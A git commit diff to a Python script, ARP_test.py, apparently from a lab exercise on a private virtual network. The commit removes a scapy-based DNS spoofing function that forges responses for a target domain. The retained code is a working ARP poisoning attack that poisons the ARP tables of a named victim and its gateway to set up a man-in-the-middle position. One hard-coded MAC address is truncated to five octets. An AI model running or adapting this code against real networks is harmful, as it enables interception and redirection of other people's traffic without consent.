9b956d79d04fa806a0caec3eb92366644fdf915d
Max <43404248+impaex@users.noreply.github.com>
2023-06-11 00:36:43 +0200

    Update ARP_test.py

--- ARP_test.py
+++ ARP_test.py
@@ -1,6 +1,5 @@
+from scapy.all import Ether, ARP, sendp
 import netifaces
-import time
-from scapy.all import Ether, ARP, IP, UDP, DNS, DNSQR, DNSRR, get_if_hwaddr, sendp
 
 def sendPoisonPacket(ipAttacker, macAttacker, ipTarget, macTarget, ipToSpoof, iface):
     # Build ARP Packet
@@ -14,23 +13,6 @@ def sendPoisonPacket(ipAttacker, macAttacker, ipTarget, macTarget, ipToSpoof, if
     # Send ARP Packet
     sendp(arp, iface=iface)
 
-def spoofDNS(pkt):
-    if pkt.haslayer(DNSQR):
-        # Check if it's a DNS query
-        victim_domain = "example.com"  # Modify this with the target domain
-        spoofed_ip = "192.168.56.103"  # Modify this with the IP to redirect
-
-        # Check if the queried domain matches the victim domain
-        if pkt[DNSQR].qname.decode() == victim_domain:
-            # Build DNS response
-            dns_response = Ether() / IP(dst=pkt[IP].src) / UDP(dport=pkt[UDP].sport, sport=53) / \
-                           DNS(id=pkt[DNS].id, qr=1, aa=1, qdcount=1, ancount=1,
-                               qd=DNSQR(qname=pkt[DNSQR].qname),
-                               an=DNSRR(rrname=pkt[DNSQR].qname, rdata=spoofed_ip))
-
-            # Send DNS response
-            sendp(dns_response, iface=iface, verbose=0)
-
 # Attacker machine
 ipAttacker = "192.168.56.103"  # Modify this with the attacker machine IP address
 macAttacker = "08:00:27:d0:4b"  # Modify this with the attacker machine MAC address
@@ -39,21 +21,22 @@ macAttacker = "08:00:27:d0:4b"  # Modify this with the attacker machine MAC addr
 ipVictim = "192.168.56.101"  # Modify this with the victim machine IP address
 macVictim = "08:00:27:b7:c4:af"  # Modify this with the victim machine MAC address
 
-# Server machine
-ipServer = "192.168.56.102"  # Modify this with the server machine IP address
-macServer = "08:00:27:cc:08:6f"  # Modify this with the server machine MAC address
+# Gateway machine
+ipGateway = "192.168.56.1"  # Modify this with the gateway machine IP address
+macGateway = "08:00:27:94:63:8c"  # Modify this with the gateway machine MAC address
 
 # Find the interface name
 interfaces = netifaces.interfaces()
 iface = interfaces[0]  # Assumes the first interface is the correct one, you can modify this based on your setup
 
-# Send ARP packets to poison victim's and server's ARP tables
-sendPoisonPacket(ipAttacker, macAttacker, ipVictim, macVictim, ipServer, iface)
-sendPoisonPacket(ipAttacker, macAttacker, ipServer, macServer, ipVictim, iface)
+# Send ARP packets to poison victim's and gateway's ARP tables
+sendPoisonPacket(ipAttacker, macAttacker, ipVictim, macVictim, ipGateway, iface)
+sendPoisonPacket(ipAttacker, macAttacker, ipGateway, macGateway, ipVictim, iface)
 
-# Start DNS spoofing
-print("Initialised DNS Poisoning...")
+print("ARP Poisoning initialized...")
 try:
-    sniff(filter="udp port 53", prn=spoofDNS, iface=iface, store=0)
+    # Keep the program running
+    while True:
+        pass
 except KeyboardInterrupt:
-    print("Stopped DNS Poisoning")
+    print("ARP Poisoning stopped")
